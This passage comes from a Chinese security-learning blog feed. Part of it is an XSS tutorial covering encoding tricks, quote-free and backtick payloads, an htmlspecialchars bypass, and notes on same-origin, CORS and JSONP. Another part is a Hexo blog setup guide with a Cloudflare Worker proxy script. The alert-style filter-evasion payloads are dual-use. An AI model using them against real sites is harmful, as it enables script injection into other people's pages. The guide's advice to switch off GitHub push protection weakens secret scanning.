title="5.2.9 编码绕过"></a>5.2.9 编码绕过</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&amp; ——&gt; &amp;amp;</span><br><span class="line"><span class="string">&quot; ——&gt; &amp;quot;</span></span><br><span class="line"><span class="string">&#x27; ——&gt; &amp;#039;</span></span><br><span class="line"><span class="string">&lt; ——&gt; &amp;#lt;</span></span><br><span class="line"><span class="string">&gt; ——&gt; &amp;#gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Unicode编码</span></span><br><span class="line"><span class="string">r --&gt; &amp;#x0072 &amp;#0114</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">url编码</span></span><br><span class="line"><span class="string">&lt;img src=&quot;</span>javascript:%61%6C%65%72%74%28%22%78%73%73%22%29%3B;<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ASCII码</span></span><br><span class="line"><span class="string">&lt;img src=&quot;</span>javascript:97,108,101,114,116,40,34,120,115,115,34,41,59<span class="string">&quot;&gt;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">base64编码</span></span><br><span class="line"><span class="string">&lt;img src=&quot;</span>javascript:YWxlcnQoJ3hzcycpOw==<span class="string">&quot;&gt;</span></span><br></pre></td></tr></table></figure><h4 id="5-2-10-过滤双引号、单引号"><a href="#5-2-10-过滤双引号、单引号" class="headerlink" title="5.2.10 过滤双引号、单引号"></a>5.2.10 过滤双引号、单引号</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">如果是html标签中，我们可以不用引号。如果是在js中，我们可以用反引号代替单双引号</span><br><span class="line">示例：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>&#x27;<span class="attr">xss</span>&#x27;);&gt;</span></span><br><span class="line">替换：</span><br><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">alert(</span>`<span class="attr">xss</span>`);&gt;</span></span><br></pre></td></tr></table></figure><h4 id="5-2-11-htmlspecialchars绕过"><a href="#5-2-11-htmlspecialchars绕过" class="headerlink" title="5.2.11 htmlspecialchars绕过"></a>5.2.11 htmlspecialchars绕过</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">没有对<span class="string">&#x27;进行实体编码，可以使用单引号构造payload</span></span><br><span class="line"><span class="string">#&#x27;</span> onclick=<span class="string">&#x27;alert(/xss/)&#x27;</span></span><br><span class="line">#<span class="string">&#x27; onmousemove=&#x27;</span><span class="title function_">alert</span>(<span class="regexp">/xss/</span>)<span class="string">&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">javascript:alert(123)</span></span><br></pre></td></tr></table></figure><h2 id="6-同源和跨域"><a href="#6-同源和跨域" class="headerlink" title="6 同源和跨域"></a>6 同源和跨域</h2><h3 id="6-1-跨域"><a href="#6-1-跨域" class="headerlink" title="6.1 跨域"></a>6.1 跨域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http:// www . baidu.com : 80 /index.php</span><br><span class="line">协议    子域名    主域名    端口  资源地址</span><br><span class="line">当协议、主机（主域名、子域名）、端口中的任意一个不相同时，称为不同域。不同域之间请求数据的操作，称为跨域操作。</span><br></pre></td></tr></table></figure><h3 id="6-2-同源"><a href="#6-2-同源" class="headerlink" title="6.2 同源"></a>6.2 同源</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">对于js代码来说，为了安全考虑，所有浏览器都约定了“同源策略”，同源策略禁止页面加载或执行与自身来源不同的域的任何脚本，即不同域之间不能使用js进行操作。比如：x.com的js不能操作y.com域名下的对象。</span><br><span class="line">为什么要有同源策略呢？比如一个恶意网站页面通过js嵌入了银行的登录页面（二者不同源），也就是说恶意的请求了其他网站的页面或数据，拿到自己页面上用，如果没有同源限制，恶意网页的js脚本就可以在用户登录银行的时候获取用户名和密码。</span><br><span class="line"></span><br><span class="line">不受同源策略影响：（资源类型有限）</span><br><span class="line">&lt;script src=&quot;...&quot;&gt;//js加载执行</span><br><span class="line">&lt;img src=&quot;...&quot;&gt;//图片</span><br><span class="line">&lt;link href=&quot;...&quot;&gt;//css</span><br><span class="line">&lt;iframe src=&quot;...&quot;&gt;//任意资源</span><br><span class="line">&lt;a href=&quot;...&quot;&gt;//超链接地址</span><br><span class="line"></span><br><span class="line">修改：</span><br><span class="line">phpstudy\www\pikachu\pkxss\rkeypress\rkserver.php</span><br><span class="line">Access-Control-Allow-Origin:*,允许所有人访问。一般不会设置*。</span><br></pre></td></tr></table></figure><h3 id="6-3-cors跨域"><a href="#6-3-cors跨域" class="headerlink" title="6.3 cors跨域"></a>6.3 cors跨域</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//设置允许被跨域访问</span><br><span class="line">header(&quot;Access-Control-Allow-Origin:*&quot;);</span><br></pre></td></tr></table></figure><h3 id="6-4-jsonp跨域"><a href="#6-4-jsonp跨域" class="headerlink" title="6.4 jsonp跨域"></a>6.4 jsonp跨域</h3><p>是一种利用 <code>&lt;script&gt;</code> 标签进行跨域数据请求的技术。它允许你在网页中请求来自其他域的数据，而无需担心浏览器的同源策略（Same-Origin Policy）带来的限制。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全 </category>
          
          <category> web安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> web安全 </tag>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>博客教程</title>
      <link href="/2024/10/17/%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/"/>
      <url>/2024/10/17/%E5%8D%9A%E5%AE%A2%E6%95%99%E7%A8%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="博客介绍"><a href="#博客介绍" class="headerlink" title="博客介绍"></a>博客介绍</h1><p>该博客使用Github pages搭建，使用cloudflare加速，采用Hexo框架，使用安知鱼主题。</p><h1 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h1><p>搭建Hexo博客，快速简洁高效，零成本搭建个人博客：（Hexo + GitHub Pages + Cloudflare Pages 完整指南）<br><a href="https://blog.cmliussss.com/p/HexoBlogNo1/">https://blog.cmliussss.com/p/HexoBlogNo1/</a><br>美化Hexo博客，主题安装配置： （安知鱼）<br><a href="https://blog.cmliussss.com/p/HexoBlogNo2/">https://blog.cmliussss.com/p/HexoBlogNo2/</a><br>魔改教程：<br><a href="https://www.fomal.cc/posts/4aa2d85f.html">https://www.fomal.cc/posts/4aa2d85f.html</a><br>安知鱼主题教程：<br><a href="https://hexo.geekswg.top/anzhiyu-docs">https://hexo.geekswg.top/anzhiyu-docs</a></p><p>github+cloudflare搭建图床并实现加速：</p><p><a href="https://james-blog.top/posts/21.html">https://james-blog.top/posts/21.html</a></p><p>附worker代码，防止原教程失效(亲测，只需修改两处即可使用)</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Website you intended to retrieve for users.</span></span><br><span class="line"><span class="keyword">const</span> upstream = <span class="string">&quot;raw.githubusercontent.com&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Custom pathname for the upstream website.</span></span><br><span class="line"><span class="comment">// (1) 填写代理的路径，格式为 /&lt;用户&gt;/&lt;仓库名&gt;/&lt;分支&gt;</span></span><br><span class="line"><span class="keyword">const</span> upstream_path = <span class="string">&quot;****&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// github personal access token.</span></span><br><span class="line"><span class="comment">// (2) 填写github令牌</span></span><br><span class="line"><span class="keyword">const</span> github_token = <span class="string">&quot;****&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Website you intended to retrieve for users using mobile devices.</span></span><br><span class="line"><span class="keyword">const</span> upstream_mobile = upstream;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Countries and regions where you wish to suspend your service.</span></span><br><span class="line"><span class="keyword">const</span> blocked_region = [];</span><br><span class="line"></span><br><span class="line"><span class="comment">// IP addresses which you wish to block from using your service.</span></span><br><span class="line"><span class="keyword">const</span> blocked_ip_address = [<span class="string">&quot;0.0.0.0&quot;</span>, <span class="string">&quot;127.0.0.1&quot;</span>];</span><br><span class="line"></span><br><span class="line"><span class="comment">// Whether to use HTTPS protocol for upstream address.</span></span><br><span class="line"><span class="keyword">const</span> https = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Whether to disable cache.</span></span><br><span class="line"><span class="keyword">const</span> disable_cache = <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Replace texts.</span></span><br><span class="line"><span class="keyword">const</span> replace_dict = &#123;</span><br><span class="line">  <span class="attr">$upstream</span>: <span class="string">&quot;$custom_domain&quot;</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="title function_">addEventListener</span>(<span class="string">&quot;fetch&quot;</span>, <span class="function">(<span class="params">event</span>) =&gt;</span> &#123;</span><br><span class="line">  event.<span class="title function_">respondWith</span>(<span class="title function_">fetchAndApply</span>(event.<span class="property">request</span>));</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">fetchAndApply</span>(<span class="params">request</span>) &#123;</span><br><span class="line">  <span class="keyword">const</span> region = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&quot;cf-ipcountry&quot;</span>)?.<span class="title function_">toUpperCase</span>();</span><br><span class="line">  <span class="keyword">const</span> ip_address = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&quot;cf-connecting-ip&quot;</span>);</span><br><span class="line">  <span class="keyword">const</span> user_agent = request.<span class="property">headers</span>.<span class="title function_">get</span>(<span class="string">&quot;user-agent&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">let</span> response = <span class="literal">null</span>;</span><br><span class="line">  <span class="keyword">let</span> url = <span class="keyword">new</span> <span class="title function_">URL</span>(request.<span class="property">url</span>);</span><br><span class="line">  <span class="keyword">let</span> url_hostname = url.<span class="property">hostname</span>;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (https == <span class="literal">true</span>) &#123;</span><br><span class="line">    url.<span class="property">protocol</span> = <span class="string">&quot;https:&quot;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    url.<span class="property">protocol</span> = <span class="string">&quot;http:&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">await</span> <span class="title function_">device_status</span>(user_agent)) &#123;</span><br><span class="line">    <span class="keyword">var</span> upstream_domain = upstream;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">var</span> upstream_domain = upstream_mobile;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  url.<span class="property">host</span> = upstream_domain;</span><br><span class="line">  <span class="keyword">if</span> (url.<span class="property">pathname</span> == <span class="string">&quot;/&quot;</span>) &#123;</span><br><span class="line">    url.<span class="property">pathname</span> = upstream_path;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    url.<span class="property">pathname</span> = upstream_path + url.<span class="property">pathname</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (blocked_region.<span class="title function_">includes</span>(region)) &#123;</span><br><span class="line">    response = <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">      <span class="string">&quot;Access denied: WorkersProxy is not available in your region yet.&quot;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">status</span>: <span class="number">403</span>,</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (blocked_ip_address.<span class="title function_">includes</span>(ip_address)) &#123;</span><br><span class="line">    response = <span class="keyword">new</span> <span class="title class_">Response</span>(</span><br><span class="line">      <span class="string">&quot;Access denied: Your IP address is blocked by WorkersProxy.&quot;</span>,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">status</span>: <span class="number">403</span>,</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> method = request.<span class="property">method</span>;</span><br><span class="line">    <span class="keyword">let</span> request_headers = request.<span class="property">headers</span>;</span><br><span class="line">    <span class="keyword">let</span> new_request_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(request_headers);</span><br><span class="line"></span><br><span class="line">    new_request_headers.<span class="title function_">set</span>(<span class="string">&quot;Host&quot;</span>, upstream_domain);</span><br><span class="line">    new_request_headers.<span class="title function_">set</span>(<span class="string">&quot;Referer&quot;</span>, url.<span class="property">protocol</span> + <span class="string">&quot;//&quot;</span> + url_hostname);</span><br><span class="line">    new_request_headers.<span class="title function_">set</span>(<span class="string">&quot;Authorization&quot;</span>, <span class="string">&quot;token &quot;</span> + github_token);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> original_response = <span class="keyword">await</span> <span class="title function_">fetch</span>(url.<span class="property">href</span>, &#123;</span><br><span class="line">      <span class="attr">method</span>: method,</span><br><span class="line">      <span class="attr">headers</span>: new_request_headers,</span><br><span class="line">      <span class="attr">body</span>: request.<span class="property">body</span>,</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> connection_upgrade = new_request_headers.<span class="title function_">get</span>(<span class="string">&quot;Upgrade&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (connection_upgrade &amp;&amp; connection_upgrade.<span class="title function_">toLowerCase</span>() == <span class="string">&quot;websocket&quot;</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> original_response;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> original_response_clone = original_response.<span class="title function_">clone</span>();</span><br><span class="line">    <span class="keyword">let</span> original_text = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">let</span> response_headers = original_response.<span class="property">headers</span>;</span><br><span class="line">    <span class="keyword">let</span> new_response_headers = <span class="keyword">new</span> <span class="title class_">Headers</span>(response_headers);</span><br><span class="line">    <span class="keyword">let</span> status = original_response.<span class="property">status</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (disable_cache) &#123;</span><br><span class="line">      new_response_headers.<span class="title function_">set</span>(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;no-store&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      new_response_headers.<span class="title function_">set</span>(<span class="string">&quot;Cache-Control&quot;</span>, <span class="string">&quot;max-age=43200000&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    new_response_headers.<span class="title function_">set</span>(<span class="string">&quot;access-control-allow-origin&quot;</span>, <span class="string">&quot;*&quot;</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">set</span>(<span class="string">&quot;access-control-allow-credentials&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">delete</span>(<span class="string">&quot;content-security-policy&quot;</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">delete</span>(<span class="string">&quot;content-security-policy-report-only&quot;</span>);</span><br><span class="line">    new_response_headers.<span class="title function_">delete</span>(<span class="string">&quot;clear-site-data&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (new_response_headers.<span class="title function_">get</span>(<span class="string">&quot;x-pjax-url&quot;</span>)) &#123;</span><br><span class="line">      new_response_headers.<span class="title function_">set</span>(</span><br><span class="line">        <span class="string">&quot;x-pjax-url&quot;</span>,</span><br><span class="line">        response_headers</span><br><span class="line">          .<span class="title function_">get</span>(<span class="string">&quot;x-pjax-url&quot;</span>)</span><br><span class="line">          .<span class="title function_">replace</span>(<span class="string">&quot;//&quot;</span> + upstream_domain, <span class="string">&quot;//&quot;</span> + url_hostname)</span><br><span class="line">      );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> content_type = new_response_headers.<span class="title function_">get</span>(<span class="string">&quot;content-type&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (</span><br><span class="line">      content_type != <span class="literal">null</span> &amp;&amp;</span><br><span class="line">      content_type.<span class="title function_">includes</span>(<span class="string">&quot;text/html&quot;</span>) &amp;&amp;</span><br><span class="line">      content_type.<span class="title function_">includes</span>(<span class="string">&quot;UTF-8&quot;</span>)</span><br><span class="line">    ) &#123;</span><br><span class="line">      original_text = <span class="keyword">await</span> <span class="title function_">replace_response_text</span>(</span><br><span class="line">        original_response_clone,</span><br><span class="line">        upstream_domain,</span><br><span class="line">        url_hostname</span><br><span class="line">      );</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      original_text = original_response_clone.<span class="property">body</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    response = <span class="keyword">new</span> <span class="title class_">Response</span>(original_text, &#123;</span><br><span class="line">      status,</span><br><span class="line">      <span class="attr">headers</span>: new_response_headers,</span><br><span class="line">    &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> response;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">replace_response_text</span>(<span class="params">response, upstream_domain, host_name</span>) &#123;</span><br><span class="line">  <span class="keyword">let</span> text = <span class="keyword">await</span> response.<span class="title function_">text</span>();</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> i, j;</span><br><span class="line">  <span class="keyword">for</span> (i <span class="keyword">in</span> replace_dict) &#123;</span><br><span class="line">    j = replace_dict[i];</span><br><span class="line">    <span class="keyword">if</span> (i == <span class="string">&quot;$upstream&quot;</span>) &#123;</span><br><span class="line">      i = upstream_domain;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (i == <span class="string">&quot;$custom_domain&quot;</span>) &#123;</span><br><span class="line">      i = host_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (j == <span class="string">&quot;$upstream&quot;</span>) &#123;</span><br><span class="line">      j = upstream_domain;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (j == <span class="string">&quot;$custom_domain&quot;</span>) &#123;</span><br><span class="line">      j = host_name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> re = <span class="keyword">new</span> <span class="title class_">RegExp</span>(i, <span class="string">&quot;g&quot;</span>);</span><br><span class="line">    text = text.<span class="title function_">replace</span>(re, j);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> text;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">device_status</span>(<span class="params">user_agent_info</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> agents = [</span><br><span class="line">    <span class="string">&quot;Android&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iPhone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;SymbianOS&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Windows Phone&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iPad&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iPod&quot;</span>,</span><br><span class="line">  ];</span><br><span class="line">  <span class="keyword">var</span> flag = <span class="literal">true</span>;</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> v = <span class="number">0</span>; v &lt; agents.<span class="property">length</span>; v++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (user_agent_info.<span class="title function_">indexOf</span>(agents[v]) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">      flag = <span class="literal">false</span>;</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> flag;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">//作者: James He</span></span><br><span class="line"><span class="comment">//链接: https://james-blog.top/posts/21.html</span></span><br><span class="line"><span class="comment">//来源: James的成长之路</span></span><br><span class="line"><span class="comment">//著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span></span><br></pre></td></tr></table></figure><p>Twikoo评论系统部署(Vercel方式)</p><p>参考文字教程：</p><ul><li><p><a href="https://twikoo.js.org/quick-start.html#%E9%92%88%E5%AF%B9-vercel-%E9%83%A8%E7%BD%B2%E7%9A%84%E6%9B%B4%E6%96%B0%E6%96%B9%E5%BC%8F">官方：Twikoo文档-针对Vercel的部署</a></p></li><li><p><a href="https://tzy1997.com/articles/hexo1611/">TZY：基于 Hexo 键入评论功能</a></p></li><li><blockquote><p>在静态博客里添加Twikoo评论系统，并配置邮箱和TG通知<br><a href="https://thirdshire.com/twikoo-tutorial/">https://thirdshire.com/twikoo-tutorial/</a><br><a href="https://sheerkvc.top/2024/01/22/62.commentUpdate/">https://sheerkvc.top/2024/01/22/62.commentUpdate/</a><br>快速创建Google应用专用密码，登录第三方邮箱app<br><a href="https://www.milesytech.com/d/36">https://www.milesytech.com/d/36</a></p></blockquote></li></ul><p>视频教程：</p><ul><li><a href="https://www.bilibili.com/video/BV1Fh411e7ZH/">Twikoo Vercel 部署教程</a></li><li><a href="https://www.bilibili.com/video/BV1Re4y1H7g8/">安知鱼：23.butterfly配置twikoo评论系统</a></li></ul><h2 id="操作命令"><a href="#操作命令" class="headerlink" title="操作命令"></a>操作命令</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#三合一：hexo cl; hexo g; hexo d</span></span><br><span class="line">hexo clean <span class="comment"># 清除已经生成的旧文件，删除public文件夹</span></span><br><span class="line">hexo generate <span class="comment"># 生成静态文件，把md文件转换为html，存储到public文件夹下</span></span><br><span class="line">hexo server <span class="comment"># 运行服务，本地预览，一般地址为 http://localhost:4000/</span></span><br><span class="line">hexo deploy <span class="comment"># 上传，每次上传会覆盖全部代码，可以把非md文件复制到sourec文件夹下，该处文件也会复制到public文件夹下</span></span><br><span class="line">hexo new hello <span class="comment"># 自动使用scaffolds目录下的模版 Created: *\source\_posts\hello.md</span></span><br></pre></td></tr></table></figure><blockquote><p>上传需要把<a href="https://github.com/settings/security_analysis">https://github.com/settings/security_analysis</a> Push protection for yourself 关闭，以后再打开。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 博客教程 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 博客教程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>测试</title>
      <link href="/2024/10/16/%E6%B5%8B%E8%AF%95/"/>
      <url>/2024/10/16/%E6%B5%8B%E8%AF%95/</url>
      
